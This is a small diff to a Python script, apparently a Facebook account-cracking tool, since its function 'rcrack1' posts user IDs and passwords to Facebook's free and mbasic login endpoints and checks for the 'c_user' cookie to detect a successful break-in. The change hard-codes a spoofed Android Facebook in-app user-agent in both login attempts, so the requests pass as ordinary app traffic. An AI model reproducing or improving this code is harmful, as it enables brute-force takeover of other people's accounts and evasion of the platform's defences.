@@ -369,7 +369,7 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; STK-L22 Build/HUAWEISTK-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.115 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/247.0.0.42.116',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -503,7 +503,7 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; STK-L22 Build/HUAWEISTK-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.115 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/247.0.0.42.116',}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
